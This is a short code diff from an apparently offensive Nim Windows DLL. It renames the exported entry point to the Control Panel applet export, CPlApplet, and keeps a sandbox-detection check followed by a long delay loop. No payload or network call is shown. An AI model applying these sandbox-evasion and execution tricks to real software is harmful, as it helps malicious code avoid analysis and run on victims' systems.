@@ -401,7 +401,7 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
         NimMain()
     return true
 
-proc start(hwnd: HWND, hinst: HINSTANCE, lpszCmdLine: LPSTR, nCmdShow: int): void {.stdcall, exportc, dynlib.} =
+proc CPlApplet(hwndCpl: HWND, msg: UINT, lParam1: LPARAM, lParam2: LPARAM): LONG {.stdcall, exportc, dynlib.} =
     if sbCheck() >= 2:
         #echo "sbCheck returned true! "
         for i in 1 .. 10000000:
